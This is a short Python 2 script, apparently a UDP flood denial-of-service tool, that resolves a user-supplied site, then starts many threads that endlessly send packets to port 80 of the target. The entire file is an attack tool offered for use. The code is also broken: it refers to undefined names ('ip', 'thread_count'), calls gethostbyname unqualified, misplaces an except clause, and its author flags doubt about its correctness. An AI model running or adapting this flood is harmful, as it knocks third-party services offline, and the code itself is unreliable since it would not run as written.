import thread , socket , sys
import MyScreen as screen

def attack():
  UDP_PORT = 80
  MESSAGE  = "Crazy8" 
 
  siteUrl     = screen.getUrl()
  threadCount = screen.getThreadCount()
  targetIp    = gethostbyname(siteUrl)
  
  screen.showTargetInfo(targetIp, UDP_PORT)
  screen.sleep()
  
  # ATTENTION, I'm not sure about the correctness of this section
  def dos(i):
    while True:
      sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      sock.sendto(MESSAGE, (ip, UDP_PORT))
      print "Packet Sent"

  for i in xrange(thread_count):
    try:
      thread.start_new_thread( dos , ("Thread-"+str(i),) )
      except KeyboardInterrupt:
        sys.exit(0)
  while 1:
    pass
  